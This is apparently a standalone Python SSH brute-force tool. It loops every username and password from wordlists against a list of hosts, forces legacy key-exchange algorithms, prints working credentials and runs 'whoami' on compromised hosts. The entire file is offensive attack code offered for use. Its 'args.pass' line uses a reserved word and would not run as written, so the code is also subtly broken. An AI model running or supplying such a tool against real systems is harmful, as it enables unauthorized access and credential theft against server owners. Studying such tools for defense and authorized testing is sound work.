import paramiko
import socket
import argparse
import sys
import signal
from itertools import product
from paramiko import SSHClient, AutoAddPolicy
from termcolor import colored

# Set legacy algorithm preferences
paramiko.transport._preferred_kex = ['diffie-hellman-group14-sha1']
paramiko.transport._preferred_keys = ['ssh-rsa']

# Handle Ctrl+C gracefully
def signal_handler(sig, frame):
    print("\n[!] Interrupted. Exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def parse_args():
    parser = argparse.ArgumentParser(description="SSH brute tester with legacy algorithm support")
    parser.add_argument("--user", "-u", required=True, help="Path to file with usernames")
    parser.add_argument("--pass", "-p", required=True, help="Path to file with passwords")
    parser.add_argument("--host", required=True, help="Path to file with hosts")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def load_list(path):
    with open(path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def try_ssh(host, username, password, verbose=False):
    try:
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(
            hostname=host,
            username=username,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=5,
            banner_timeout=5
        )
        if verbose:
            try:
                stdin, stdout, stderr = client.exec_command("whoami")
                banner = stdout.read().decode().strip()
                print(colored("[+] Success:", "green"), f"{username}@{host}:{password} -> {banner}")
            except Exception as e:
                print(colored("[+] Success:", "green"), f"{username}@{host}:{password} (no banner)")
        else:
            print(colored("[+] Success:", "green"), f"{username}@{host}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        if verbose:
            print(f"[-] Auth failed: {username}@{host}:{password}")
    except paramiko.SSHException as e:
        if verbose:
            print(f"[!] SSH error: {host} - {str(e)}")
    except socket.error as e:
        if verbose:
            print(f"[!] Socket error on {host} - {str(e)}")
    return False

def main():
    args = parse_args()
    hosts = load_list(args.host)
    users = load_list(args.user)
    pwds = load_list(args.pass)

    for host in hosts:
        for username, password in product(users, pwds):
            try_ssh(host, username, password, verbose=args.verbose)

if __name__ == "__main__":
    main()
